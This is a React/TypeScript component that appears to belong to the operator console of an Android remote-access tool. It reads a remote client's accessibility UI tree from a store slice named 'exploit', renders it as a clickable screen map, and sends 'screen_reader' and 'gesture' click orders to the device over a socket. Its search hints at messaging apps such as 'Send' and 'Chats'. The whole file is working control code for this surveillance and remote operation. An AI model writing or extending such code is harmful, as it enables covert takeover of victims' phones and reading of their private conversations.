import { useEffect, useMemo, useState } from 'react'
import { Button } from '@/components/ui/button'
import { Accessibility, Play, Square, Search } from 'lucide-react'
import { emitOrder } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'
import type { ReaderNode } from '@/store/slices/exploit-slice'

export function ScreenReaderTab({ clientId }: { clientId: string }) {
  const rawNodes = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.readerNodes ?? [],
  )
  const SCREEN_W = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.screenW ?? 720,
  )
  const SCREEN_H = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.screenH ?? 1478,
  )
  const currentPkg = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.readerPkg ?? '',
  )

  const [active, setActive] = useState(false)
  const [query, setQuery] = useState('')

  const nodes = useMemo(() => {
    const filtered = rawNodes.filter((n) => {
      if (!n.b) return false
      const [l, t, r, b] = n.b.split(',').map(Number)
      const w = r - l
      const h = b - t
      const cls = n.cl || ''

      const isLayout = cls.endsWith('Layout') || cls.includes('ViewGroup')
      if (isLayout && w > SCREEN_W * 0.9 && h > SCREEN_H * 0.9) {
        return false
      }

      if (w < 5 || h < 5) return false

      return true
    })

    const groups = new Map<string, ReaderNode[]>()
    const noText: ReaderNode[] = []

    for (const n of filtered) {
      const text = (n.t || n.c || '').trim()
      if (text.length === 0) {
        noText.push(n)
        continue
      }

      const [l, t] = n.b!.split(',').map(Number)
      const key = text.toLowerCase()
      if (!groups.has(key)) groups.set(key, [])
      groups.get(key)!.push(n)
    }

    const merged: ReaderNode[] = []

    for (const [_, items] of groups) {
      items.sort((a, b) => {
        if (a.ck && !b.ck) return -1
        if (!a.ck && b.ck) return 1

        const [al, at, ar, ab] = a.b!.split(',').map(Number)
        const [bl, bt, br, bb] = b.b!.split(',').map(Number)
        const areaA = (ar - al) * (ab - at)
        const areaB = (br - bl) * (bb - bt)
        return areaB - areaA
      })

      const best = items[0]

      let largestBounds = best.b
      let largestArea = 0

      for (const item of items) {
        if (!item.b) continue
        const [l, t, r, b] = item.b.split(',').map(Number)
        const area = (r - l) * (b - t)
        if (area > largestArea) {
          largestArea = area
          largestBounds = item.b
        }
      }

      merged.push({
        ...best,
        b: largestBounds,
      })
    }

    for (const n of noText) {
      if (n.ck) merged.push(n)
    }

    if (!query) return merged
    const q = query.toLowerCase()
    return merged.filter((n) =>
      (n.t || n.c || '').toLowerCase().includes(q),
    )
  }, [rawNodes, query, SCREEN_W, SCREEN_H])

  useEffect(() => {
    return () => {
      if (active) emitOrder(clientId, 'screen_reader', { action: 'stop' })
    }
  }, [])

  const start = () => {
    setActive(true)
    emitOrder(clientId, 'screen_reader', { action: 'start' })
  }
  const stop = () => {
    setActive(false)
    emitOrder(clientId, 'screen_reader', { action: 'stop' })
  }

  const clickNode = (n: ReaderNode) => {
    if (!n.b) return
    const [l, t, r, b] = n.b.split(',').map(Number)
    const cx = Math.round(l + (r - l) / 2)
    const cy = Math.round(t + (b - t) / 2)
    emitOrder(clientId, 'gesture', { type: 'click', x: cx, y: cy })
  }

  return (
    <div className="space-y-3">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Accessibility className="h-4 w-4 text-emerald-400" />
          <h3 className="text-sm font-semibold text-zinc-100">
            Screen Reader
          </h3>
        </div>
        <span
          className={`text-xs ${
            active ? 'text-emerald-400' : 'text-zinc-500'
          }`}
        >
          {active ? 'Active' : 'Inactive'}
        </span>
      </div>

      {/* Package */}
      {currentPkg && (
        <div className="text-[10px] text-zinc-500">
          Package: <span className="text-emerald-400">{currentPkg}</span>
        </div>
      )}

      {/* Search */}
      <div className="relative">
        <Search className="absolute left-2 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-zinc-500" />
        <input
          type="text"
          placeholder="Search (Send, Chats...)"
          value={query}
          onChange={(e) => setQuery(e.target.value)}
          className="w-full rounded-md bg-zinc-900 pl-8 pr-3 py-1.5 text-xs text-zinc-100 placeholder:text-zinc-600 border border-white/10 focus:border-emerald-500/50 focus:outline-none"
        />
      </div>

      <div className="flex justify-center w-full">
        <div
          className="relative overflow-hidden rounded-xl border border-white/10 bg-zinc-950"
          style={{
            height: 'min(55vh, 600px)',
            aspectRatio: `${SCREEN_W} / ${SCREEN_H}`,
            maxWidth: '100%',
          }}
        >
          {nodes.length === 0 ? (
            <div className="absolute inset-0 grid place-items-center text-zinc-600 text-xs text-center px-4">
              {rawNodes.length > 0
                ? 'No match for search'
                : 'Start reader to see UI structure'}
            </div>
          ) : (
            nodes.map((n, i) => {
              if (!n.b) return null
              const [l, t, r, b] = n.b.split(',').map(Number)

              const leftPct = (l / SCREEN_W) * 100
              const topPct = (t / SCREEN_H) * 100
              const widthPct = ((r - l) / SCREEN_W) * 100
              const heightPct = ((b - t) / SCREEN_H) * 100

              if (widthPct < 0.3 || heightPct < 0.3) return null

              let colorClass =
                'bg-white/5 text-zinc-400 ring-1 ring-white/10'
              if (n.ck) {
                colorClass =
                  'bg-emerald-500/15 text-emerald-200 ring-1 ring-emerald-500/40 hover:bg-emerald-500/30 cursor-pointer'
              }

              return (
                <button
                  key={i}
                  onClick={() => n.ck && clickNode(n)}
                  disabled={!n.ck}
                  title={`${n.t || n.c || ''}\n${n.cl || ''}\n${n.b}`}
                  className={`absolute rounded text-[8px] leading-tight truncate px-0.5 ${colorClass}`}
                  style={{
                    left: `${leftPct}%`,
                    top: `${topPct}%`,
                    width: `${widthPct}%`,
                    height: `${heightPct}%`,
                  }}
                >
                  {n.t || n.c || ''}
                </button>
              )
            })
          )}
        </div>
      </div>

      {/* Stats */}
      <div className="flex items-center justify-between text-[10px] text-zinc-600">
        <span>
          Nodes: {nodes.length} / {rawNodes.length}
        </span>
        <span>
          Screen: {SCREEN_W}×{SCREEN_H}
        </span>
      </div>

      {/* Controls */}
      <div className="flex gap-2">
        {!active ? (
          <Button
            onClick={start}
            className="bg-emerald-500 hover:bg-emerald-400 text-zinc-950 font-semibold"
          >
            <Play className="h-4 w-4" /> Start Reader
          </Button>
        ) : (
          <Button
            onClick={stop}
            className="bg-rose-500/90 hover:bg-rose-500 text-white font-semibold"
          >
            <Square className="h-4 w-4" /> Stop
          </Button>
        )}
      </div>
    </div>
  )
}
